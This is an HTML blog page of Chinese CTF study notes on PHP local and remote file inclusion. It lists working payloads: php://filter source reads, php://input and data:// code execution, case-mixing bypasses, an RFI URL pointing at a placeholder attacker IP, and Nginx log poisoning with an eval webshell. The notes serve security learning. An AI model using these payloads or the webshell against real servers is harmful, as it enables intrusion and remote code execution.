@@ -1,0 +1,923 @@
+
+<!DOCTYPE html><html lang="zh-CN">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.33.1" theme-name="Stellar" theme-version="1.33.1">
+  
+  
+  <meta name="generator" content="Hexo 8.1.1">
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#000">
+  <meta name="theme-color" content="#f9fafb">
+  <title>学习笔记-文件包含入门 - rabow's blog</title>
+
+  
+    <meta name="description" content="这是一份根据您提供的视频《[CTF知识树-WEB] 文件包含入门》整理的 Markdown 格式学习笔记。  文件包含漏洞入门1. 漏洞简介文件包含漏洞（File Inclusion） 与 SQL 注入类似，本质上是一种注入型漏洞。它的产生是因为程序没有对用户可控的输入进行严格过滤，导致攻击者可以控制包含的脚本或代码，并让服务器端去执行。 在 PHP 开发中，为了避免重复编写代码，通常会把多次使用">
+<meta property="og:type" content="article">
+<meta property="og:title" content="学习笔记-文件包含入门">
+<meta property="og:url" content="https://www.rabow.xyz/posts/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%85%A5%E9%97%A8/">
+<meta property="og:site_name" content="rabow&#39;s blog">
+<meta property="og:description" content="这是一份根据您提供的视频《[CTF知识树-WEB] 文件包含入门》整理的 Markdown 格式学习笔记。  文件包含漏洞入门1. 漏洞简介文件包含漏洞（File Inclusion） 与 SQL 注入类似，本质上是一种注入型漏洞。它的产生是因为程序没有对用户可控的输入进行严格过滤，导致攻击者可以控制包含的脚本或代码，并让服务器端去执行。 在 PHP 开发中，为了避免重复编写代码，通常会把多次使用">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://www.rabow.xyz/images/avatar.jpg">
+<meta property="article:published_time" content="2026-05-24T13:55:42.000Z">
+<meta property="article:modified_time" content="2026-05-24T13:57:06.280Z">
+<meta property="article:author" content="rabow">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="PHP">
+<meta property="article:tag" content="SQL">
+<meta property="article:tag" content="Web">
+<meta property="article:tag" content="文件包含">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://www.rabow.xyz/images/avatar.jpg">
+  
+  
+  
+  <meta name="keywords" content="SQL,CTF,Web,PHP,文件包含">
+
+  <!-- feed -->
+  
+
+  <link rel="stylesheet" href="/css/main.css?v=1.33.1">
+
+
+  
+
+  
+
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"rabow","sameAs":[],"image":"/images/avatar.jpg"},"dateCreated":"2026-05-24T21:55:42+08:00","dateModified":"2026-05-24T21:57:06+08:00","datePublished":"2026-05-24T21:55:42+08:00","description":"","headline":"学习笔记-文件包含入门","mainEntityOfPage":{"@type":"WebPage","@id":"https://www.rabow.xyz/posts/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%85%A5%E9%97%A8/"},"publisher":{"@type":"Organization","name":"rabow","sameAs":[],"image":"/images/avatar.jpg","logo":{"@type":"ImageObject","url":"/images/avatar.jpg"}},"url":"https://www.rabow.xyz/posts/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%85%A5%E9%97%A8/","keywords":"SQL, CTF, Web, PHP, 文件包含","image":[]}</script>
+  
+</head>
+<body>
+
+<div class="l_body content" id="start" layout="post" type="tech" ><aside class="l_left"><div class="sidebg"></div><div class="leftbar-container">
+
+
+<header class="header"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="/images/avatar.jpg" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></a><a class="title" href="/"><div class="main">rabow's blog</div><div class="sub cap">在这里记录CTF之路</div></a></div></header>
+
+<div class="nav-area">
+
+<nav class="menu dis-select"></nav>
+</div>
+<div class="widgets">
+<div class="search-wrapper" id="search-wrapper"><form class="search-form"><a class="search-button" onclick="document.getElementById(&quot;search-input&quot;).focus();"><svg t="1705074644177" viewBox="0 0 1025 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1560" width="200" height="200"><path d="M1008.839137 935.96571L792.364903 719.491476a56.783488 56.783488 0 0 0-80.152866 0 358.53545 358.53545 0 1 1 100.857314-335.166073 362.840335 362.840335 0 0 1-3.689902 170.145468 51.248635 51.248635 0 1 0 99.217358 26.444296 462.057693 462.057693 0 1 0-158.255785 242.303546l185.930047 185.725053a51.248635 51.248635 0 0 0 72.568068 0 51.248635 51.248635 0 0 0 0-72.978056z" p-id="1561"></path><path d="M616.479587 615.969233a50.428657 50.428657 0 0 0-61.498362-5.534852 174.655348 174.655348 0 0 1-177.525271 3.484907 49.403684 49.403684 0 0 0-58.833433 6.76482l-3.074918 2.869923a49.403684 49.403684 0 0 0 8.609771 78.10292 277.767601 277.767601 0 0 0 286.992355-5.739847 49.403684 49.403684 0 0 0 8.404776-76.667958z" p-id="1562"></path></svg></a><input type="text" class="search-input" id="search-input" placeholder="站内搜索"></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div>
+
+
+
+<widget class="widget-wrapper recent post-list"><div class="widget-header dis-select"><span class="name">最近更新</span></div><div class="widget-body fs14"><a class="item title" href="/posts/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-PHP-PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-wakeup-%E7%BB%95%E8%BF%87/"><span class="title">学习笔记-PHP-PHP反序列化__wakeup() 绕过</span></a><a class="item title" href="/posts/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-PHP-%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/"><span class="title">学习笔记-PHP-字符串逃逸</span></a><a class="item title" href="/posts/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-PHP-POP%E9%93%BE%E6%9E%84%E9%80%A0%E4%B8%8EPOC%E7%BC%96%E5%86%99/"><span class="title">学习笔记-PHP-POP链构造与POC编写</span></a><a class="item title" href="/posts/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-PHP-PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/"><span class="title">学习笔记-PHP-PHP反序列化魔术方法</span></a><a class="item title" href="/posts/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-PHP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"><span class="title">学习笔记-PHP-反序列化基础知识</span></a><a class="item title" href="/posts/%E5%B9%BF%E4%B8%9C%E5%B7%A5%E4%B8%9A%E5%A4%A7%E5%AD%A62026%E7%BD%91%E5%AE%89%E5%8D%AB%E5%A3%AB/"><span class="title">广东工业大学2026网安卫士Writeup</span></a><a class="item title" href="/posts/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%85%A5%E9%97%A8/"><span class="title">学习笔记-文件包含入门</span></a><a class="item title" href="/posts/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-SQL-%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87/"><span class="title">学习笔记-SQL-宽字节注入绕过</span></a><a class="item title" href="/posts/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-SQL-select%E5%8F%8Aunion%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87/"><span class="title">学习笔记-SQL-select及union过滤绕过</span></a><a class="item title" href="/posts/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-SQL-%E9%80%97%E5%8F%B7%E8%BF%87%E6%BB%A4%E7%9A%84-JOIN-%E7%BB%95%E8%BF%87/"><span class="title">学习笔记-SQL-逗号过滤的 JOIN 绕过</span></a></div></widget>
+</div>
+
+</div></aside><div class="l_main" id="main">
+
+
+
+
+
+<div class="article banner top">
+  <div class="content">
+    <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
+<span class="sep"></span><a class="cap breadcrumb" href="/">文章</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">学习笔记</a> <span class="sep"></span> <a class="cap breadcrumb-link" href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/PHP/">PHP</a> <span class="sep"></span> <a class="cap breadcrumb-link" href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/PHP/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">文件包含</a></div>
+<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2026-05-24T13:55:42.000Z">2026-05-24</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2026-05-24T13:57:06.280Z">2026-05-24</time></span></div></div></div>
+    
+    <div class="bottom only-title">
+      
+      <div class="text-area">
+        <h1 class="text title"><span>学习笔记-文件包含入门</span></h1>
+        
+      </div>
+    </div>
+    
+  </div>
+  </div><article class="md-text content"><p>这是一份根据您提供的视频《[CTF知识树-WEB] 文件包含入门》整理的 Markdown 格式学习笔记。</p>
+<hr>
+<h1 id="文件包含漏洞入门"><a href="#文件包含漏洞入门" class="headerlink" title="文件包含漏洞入门"></a>文件包含漏洞入门</h1><h2 id="1-漏洞简介"><a href="#1-漏洞简介" class="headerlink" title="1. 漏洞简介"></a>1. 漏洞简介</h2><p><strong>文件包含漏洞（File Inclusion）</strong> 与 SQL 注入类似，本质上是一种<strong>注入型漏洞</strong>。它的产生是因为程序没有对用户可控的输入进行严格过滤，导致攻击者可以控制包含的脚本或代码，并让服务器端去执行。</p>
+<p>在 PHP 开发中，为了避免重复编写代码，通常会把多次使用的函数写在一个单一的文件中。当需要使用这些函数时，会直接调用包含函数的文件，这个过程就叫“包含”。</p>
+<h3 id="PHP-常见文件包含函数"><a href="#PHP-常见文件包含函数" class="headerlink" title="PHP 常见文件包含函数"></a>PHP 常见文件包含函数</h3><ul>
+<li><code>include()</code>：找不到被包含的文件时只会产生<strong>警告（Warning）</strong>，脚本<strong>继续执行</strong>。</li>
+<li><code>require()</code>：找不到被包含的文件时会产生<strong>致命错误（Fatal Error）</strong>，并<strong>停止脚本运行</strong>。</li>
+<li><code>include_once()</code>：与 <code>include()</code> 类似，但如果该文件已经被包含过，则<strong>不会再次包含</strong>。</li>
+<li><code>require_once()</code>：与 <code>require()</code> 类似，但如果该文件已经被包含过，则<strong>不会再次包含</strong>。</li>
+</ul>
+<hr>
+<h2 id="2-漏洞分类与前置条件"><a href="#2-漏洞分类与前置条件" class="headerlink" title="2. 漏洞分类与前置条件"></a>2. 漏洞分类与前置条件</h2><p>文件包含漏洞主要分为两类：<strong>本地文件包含 (LFI)</strong> 和 <strong>远程文件包含 (RFI)</strong>。这两者的区分主要取决于 PHP 环境的配置。</p>
+<p>在 <code>php.ini</code> 配置文件中：</p>
+<ul>
+<li><strong>本地文件包含 (Local File Include, LFI)</strong>：无论配置如何，只要本地存在该文件即可包含。</li>
+<li><strong>远程文件包含 (Remote File Include, RFI)</strong>：需要开启特定的配置项。</li>
+<li><code>allow_url_fopen = On</code> （默认开启）</li>
+<li><code>allow_url_include = On</code> （PHP 5.2 之后默认关闭，<strong>必须开启此项才能进行 RFI</strong>）</li>
+</ul>
+<hr>
+<h2 id="3-本地文件包含-LFI-常见利用方式"><a href="#3-本地文件包含-LFI-常见利用方式" class="headerlink" title="3. 本地文件包含 (LFI) 常见利用方式"></a>3. 本地文件包含 (LFI) 常见利用方式</h2><h3 id="3-1-直接包含文件"><a href="#3-1-直接包含文件" class="headerlink" title="3.1 直接包含文件"></a>3.1 直接包含文件</h3><p>直接传入目标文件的绝对或相对路径进行包含。常用于包含图片木马。</p>
+<ul>
+<li>同目录下：<code>?file=test.txt</code></li>
+<li>使用目录遍历：<code>?file=../../test.txt</code></li>
+</ul>
+<h3 id="3-2-日志包含-Log-Inclusion"><a href="#3-2-日志包含-Log-Inclusion" class="headerlink" title="3.2 日志包含 (Log Inclusion)"></a>3.2 日志包含 (Log Inclusion)</h3><p>因为 <code>include</code> 等函数在包含文件时，如果文件内含有 PHP 语句（<code>&lt;?php ... ?&gt;</code>），就会执行该语句；如果是非 PHP 语句，则会直接原样打印输出。</p>
+<ul>
+<li><strong>原理</strong>：利用服务器的访问日志（Access Log）等。</li>
+<li><strong>前提</strong>：知道服务器日志的存储路径，且该日志文件对 Web 用户<strong>可读</strong>。</li>
+<li><strong>操作</strong>：在发起 HTTP 请求时，将恶意 PHP 代码（如一句话木马 <code>&lt;?php @eval($_REQUEST[1]);?&gt;</code>）写入 User-Agent (UA) 等字段。服务器会将其记录到日志中。随后包含该日志文件，其中的恶意代码就会被执行。</li>
+</ul>
+<h3 id="3-3-包含临时文件（条件竞争）"><a href="#3-3-包含临时文件（条件竞争）" class="headerlink" title="3.3 包含临时文件（条件竞争）"></a>3.3 包含临时文件（条件竞争）</h3><ul>
+<li><strong>原理</strong>：向 PHP 上传文件时，系统会默认在临时目录（Linux: <code>/tmp</code>, Windows: <code>C:\windows\temp</code>）下创建一个临时文件。虽然 PHP 在请求结束后会立即删除该临时文件，但攻击者可以利用<strong>条件竞争（Race Condition）</strong>，在文件被删除的瞬间抢先包含并执行它。</li>
+</ul>
+<hr>
+<h2 id="4-远程文件包含-RFI-与-PHP-伪协议"><a href="#4-远程文件包含-RFI-与-PHP-伪协议" class="headerlink" title="4. 远程文件包含 (RFI) 与 PHP 伪协议"></a>4. 远程文件包含 (RFI) 与 PHP 伪协议</h2><h3 id="4-1-远程文件包含"><a href="#4-1-远程文件包含" class="headerlink" title="4.1 远程文件包含"></a>4.1 远程文件包含</h3><p>直接包含攻击者搭建的远程服务器上的恶意文件。支持的协议包括 <code>http://</code>、<code>https://</code>、<code>ftp://</code> 等。</p>
+<ul>
+<li><strong>示例</strong>：<code>?file=http://[黑客IP]/1.txt</code> （<code>1.txt</code> 内容为恶意 PHP 代码）</li>
+</ul>
+<h3 id="4-2-强大的-PHP-伪协议-PHP-Wrappers"><a href="#4-2-强大的-PHP-伪协议-PHP-Wrappers" class="headerlink" title="4.2 强大的 PHP 伪协议 (PHP Wrappers)"></a>4.2 强大的 PHP 伪协议 (PHP Wrappers)</h3><p>PHP 提供了一系列强大的伪协议，在 CTF 题目中极为常用：</p>
+<ul>
+<li><code>file://</code>：访问本地文件系统。</li>
+<li><code>http://</code> &#x2F; <code>https://</code>：访问 HTTP(s) 网址。</li>
+<li><code>php://</code>：访问各个输入&#x2F;输出流 (I&#x2F;O streams)。<strong>（最常用）</strong></li>
+<li><code>zlib://</code>：压缩流。</li>
+<li><code>data://</code>：数据流（直接传递数据）。</li>
+</ul>
+<hr>
+<h2 id="5-实战-Payload-总结-CTF-常见套路"><a href="#5-实战-Payload-总结-CTF-常见套路" class="headerlink" title="5. 实战 Payload 总结 (CTF 常见套路)"></a>5. 实战 Payload 总结 (CTF 常见套路)</h2><h3 id="套路一：利用-php-filter-读取源码"><a href="#套路一：利用-php-filter-读取源码" class="headerlink" title="套路一：利用 php://filter 读取源码"></a>套路一：利用 <code>php://filter</code> 读取源码</h3><p>如果在题目中直接 <code>?file=flag.php</code>，通常页面只会是一片空白。因为 <code>flag.php</code> 被包含后，其内部的 PHP 代码会被执行，而不是显示出来。</p>
+<ul>
+<li><strong>Payload</strong>: <code>?file=php://filter/read=convert.base64-encode/resource=flag.php</code></li>
+<li><strong>原理解析</strong>：利用 <code>filter</code> 读取 <code>flag.php</code> 的内容，并强制对其进行 <code>base64</code> 编码。由于编码后的字符串不再是合法的 PHP 标签，服务器就不会去执行它，而是直接把 base64 密文输出在页面上。拿到密文后解码即可得到 Flag。</li>
+</ul>
+<h3 id="套路二：利用-php-input-执行代码"><a href="#套路二：利用-php-input-执行代码" class="headerlink" title="套路二：利用 php://input 执行代码"></a>套路二：利用 <code>php://input</code> 执行代码</h3><p><code>php://input</code> 可以访问请求的原始数据的只读流。它会将 POST 请求的数据作为 PHP 代码执行。</p>
+<ul>
+<li><strong>GET 请求</strong>: <code>?file=php://input</code></li>
+<li><strong>POST 数据</strong>: <code>&lt;?php system(&quot;tac flag.php&quot;); ?&gt;</code></li>
+<li><strong>注意</strong>：遇到 <code>enctype=&quot;multipart/form-data&quot;</code> 时该伪协议无效。</li>
+</ul>
+<h3 id="套路三：利用-data-执行代码"><a href="#套路三：利用-data-执行代码" class="headerlink" title="套路三：利用 data:// 执行代码"></a>套路三：利用 <code>data://</code> 执行代码</h3><p>将原本需要外部包含的文件内容直接硬编码在 URL 中传递。</p>
+<ul>
+<li><strong>明文 Payload</strong>: <code>?file=data://text/plain,&lt;?php system(&#39;tac flag.php&#39;);?&gt;</code></li>
+<li><strong>Base64 编码 Payload</strong> (用于绕过特殊字符拦截): <code>?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgZmxhZy5waHAnKTs/Pg==</code></li>
+</ul>
+<h3 id="套路四：过滤关键字绕过-大小写绕过"><a href="#套路四：过滤关键字绕过-大小写绕过" class="headerlink" title="套路四：过滤关键字绕过 (大小写绕过)"></a>套路四：过滤关键字绕过 (大小写绕过)</h3><p>如果后端代码使用了 <code>str_replace</code> 过滤了 <code>php</code>、<code>data</code> 等关键字（例如 <code>str_replace(&#39;php&#39;, &#39;???&#39;, $file)</code>）。</p>
+<ul>
+<li><strong>绕过方法</strong>：PHP 伪协议中的协议名称是<strong>不区分大小写</strong>的。</li>
+<li><strong>Payload</strong>: 使用大写混合绕过，如 <code>?file=Php://input</code> 或 <code>?file=PHP://filter...</code>。</li>
+</ul>
+<h3 id="套路五：Nginx-日志包含实战"><a href="#套路五：Nginx-日志包含实战" class="headerlink" title="套路五：Nginx 日志包含实战"></a>套路五：Nginx 日志包含实战</h3><p>当其它伪协议都被过滤时，考虑日志包含。</p>
+<ol>
+<li>抓包，修改 User-Agent 为一句话木马：<code>&lt;?php @eval($_REQUEST[1]);?&gt;</code>，发送请求使木马被写入 Nginx 日志。</li>
+<li>包含 Nginx 日志：<code>?file=/var/log/nginx/access.log</code></li>
+<li>通过 POST 发送命令执行参数：<code>1=system(&#39;tac flag.php&#39;);</code></li>
+</ol>
+<hr>
+<blockquote>
+<p><strong>💡 结语</strong>：文件包含漏洞的核心在于寻找一切能够将<strong>不可执行文件（如 txt、图片、日志、编码流）<strong>转换为</strong>可执行代码</strong>的途径。熟练掌握 <code>php://filter</code> 编码读取和 <code>php://input</code> &#x2F; <code>data://</code> 代码注入是解决此类题目的关键。</p>
+</blockquote>
+</article>
+<div class="article-footer">
+
+
+    <section id="share">
+      <div class="header"><span>分享文章</span></div>
+      <div class="body">
+        <div class="link"><input class="copy-area" readonly="true" id="copy-link" value="https://www.rabow.xyz/posts/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%85%A5%E9%97%A8/" /></div>
+        <div class="social-wrap dis-select"><a class="social share-item wechat" onclick="util.toggle(&quot;qrcode-wechat&quot;)"><img  src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/b32ef3da1162a.svg" /></a><a class="social share-item link" onclick="util.copy(&quot;copy-link&quot;, &quot;复制成功&quot;)"><img  src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/8411ed322ced6.svg" /></a></div>
+        
+        <div class="qrcode" id="qrcode-wechat" style="opacity:0;height:0">
+          <img src="https://api.qrserver.com/v1/create-qr-code/?size=256x256&data=https://www.rabow.xyz/posts/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%85%A5%E9%97%A8/"/>
+        </div>
+        
+      </div>
+    </section>
+    </div>
+
+<div class="related-wrap" id="read-next"><section class="body"><div class="item" id="prev"><div class="note">较新文章</div><a href="/posts/%E5%B9%BF%E4%B8%9C%E5%B7%A5%E4%B8%9A%E5%A4%A7%E5%AD%A62026%E7%BD%91%E5%AE%89%E5%8D%AB%E5%A3%AB/">广东工业大学2026网安卫士Writeup</a></div><div class="item" id="next"><div class="note">较早文章</div><a href="/posts/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-SQL-%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87/">学习笔记-SQL-宽字节注入绕过</a></div></section></div>
+
+
+
+
+
+
+<footer class="page-footer footnote"><hr><div class="text"><p>本站为<a href="/">rabow</a>的个人博客</p>
+</div></footer>
+<div class="main-mask" onclick="sidebar.dismiss()"></div></div><aside class="l_right">
+<div class="widgets">
+
+
+
+<widget class="widget-wrapper toc" id="data-toc" collapse="false"><div class="widget-header dis-select"><span class="name">本文目录</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%85%A5%E9%97%A8"><span class="toc-text">文件包含漏洞入门</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B"><span class="toc-text">1. 漏洞简介</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP-%E5%B8%B8%E8%A7%81%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%87%BD%E6%95%B0"><span class="toc-text">PHP 常见文件包含函数</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E6%BC%8F%E6%B4%9E%E5%88%86%E7%B1%BB%E4%B8%8E%E5%89%8D%E7%BD%AE%E6%9D%A1%E4%BB%B6"><span class="toc-text">2. 漏洞分类与前置条件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-LFI-%E5%B8%B8%E8%A7%81%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="toc-text">3. 本地文件包含 (LFI) 常见利用方式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1-%E7%9B%B4%E6%8E%A5%E5%8C%85%E5%90%AB%E6%96%87%E4%BB%B6"><span class="toc-text">3.1 直接包含文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-2-%E6%97%A5%E5%BF%97%E5%8C%85%E5%90%AB-Log-Inclusion"><span class="toc-text">3.2 日志包含 (Log Inclusion)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-3-%E5%8C%85%E5%90%AB%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6%EF%BC%88%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%EF%BC%89"><span class="toc-text">3.3 包含临时文件（条件竞争）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-RFI-%E4%B8%8E-PHP-%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-text">4. 远程文件包含 (RFI) 与 PHP 伪协议</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#4-1-%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-text">4.1 远程文件包含</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-2-%E5%BC%BA%E5%A4%A7%E7%9A%84-PHP-%E4%BC%AA%E5%8D%8F%E8%AE%AE-PHP-Wrappers"><span class="toc-text">4.2 强大的 PHP 伪协议 (PHP Wrappers)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-%E5%AE%9E%E6%88%98-Payload-%E6%80%BB%E7%BB%93-CTF-%E5%B8%B8%E8%A7%81%E5%A5%97%E8%B7%AF"><span class="toc-text">5. 实战 Payload 总结 (CTF 常见套路)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A5%97%E8%B7%AF%E4%B8%80%EF%BC%9A%E5%88%A9%E7%94%A8-php-filter-%E8%AF%BB%E5%8F%96%E6%BA%90%E7%A0%81"><span class="toc-text">套路一：利用 php:&#x2F;&#x2F;filter 读取源码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A5%97%E8%B7%AF%E4%BA%8C%EF%BC%9A%E5%88%A9%E7%94%A8-php-input-%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81"><span class="toc-text">套路二：利用 php:&#x2F;&#x2F;input 执行代码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A5%97%E8%B7%AF%E4%B8%89%EF%BC%9A%E5%88%A9%E7%94%A8-data-%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81"><span class="toc-text">套路三：利用 data:&#x2F;&#x2F; 执行代码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A5%97%E8%B7%AF%E5%9B%9B%EF%BC%9A%E8%BF%87%E6%BB%A4%E5%85%B3%E9%94%AE%E5%AD%97%E7%BB%95%E8%BF%87-%E5%A4%A7%E5%B0%8F%E5%86%99%E7%BB%95%E8%BF%87"><span class="toc-text">套路四：过滤关键字绕过 (大小写绕过)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A5%97%E8%B7%AF%E4%BA%94%EF%BC%9ANginx-%E6%97%A5%E5%BF%97%E5%8C%85%E5%90%AB%E5%AE%9E%E6%88%98"><span class="toc-text">套路五：Nginx 日志包含实战</span></a></li></ol></li></ol></li></ol></div><div class="widget-footer"><a class="top" onclick="util.scrollTop()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><!-- Icon from Solar by 480 Design - https://creativecommons.org/licenses/by/4.0/ --><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="1.5"><path stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"/><path d="M7 3.338A9.95 9.95 0 0 1 12 2c5.523 0 10 4.477 10 10s-4.477 10-10 10S2 17.523 2 12c0-1.821.487-3.53 1.338-5"/></g></svg><span>回到顶部</span></a></div></widget>
+</div></aside><div class='float-panel'>
+  <button type='button' style='display:none' class='laptop-only rightbar-toggle mobile' onclick='sidebar.rightbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg>
+  </button>
+  <button type='button' style='display:none' class='mobile-only leftbar-toggle mobile' onclick='sidebar.leftbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 11c0-3.771 0-5.657 1.172-6.828C4.343 3 6.229 3 10 3h4c3.771 0 5.657 0 6.828 1.172C22 5.343 22 7.229 22 11v2c0 3.771 0 5.657-1.172 6.828C19.657 21 17.771 21 14 21h-4c-3.771 0-5.657 0-6.828-1.172C2 18.657 2 16.771 2 13z"/><path id="sep" stroke-linecap="round" d="M5.5 10h6m-5 4h4m4.5 7V3"/></g></svg>
+  </button>
+</div>
+</div><div class="scripts">
+
+
+<script type="text/javascript">
+  window.canonical = {"originalHost":null,"officialHosts":["localhost"],"encoded":""};
+  const ctx = {
+    date_suffix: {
+      just: `刚刚`,
+      min: `分钟前`,
+      hour: `小时前`,
+      day: `天前`,
+    },
+    root : `/`,
+    tag_plugins: {
+      chat: Object.assign({"api":"https://siteinfo.listentothewind.cn/api/v1"}),
+    }
+  };
+
+  // required plugins (only load if needs)
+  if (`local_search`) {
+    ctx.search = {};
+    ctx.search.service = `local_search`;
+    if (ctx.search.service == 'local_search') {
+      let service_obj = Object.assign({}, `{"field":"all","path":"/search.json","content":true,"skip_search":null,"sort":"-date"}`);
+      ctx.search[ctx.search.service] = service_obj;
+    }
+  }
+  const def = {
+    avatar: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/3442075.svg`,
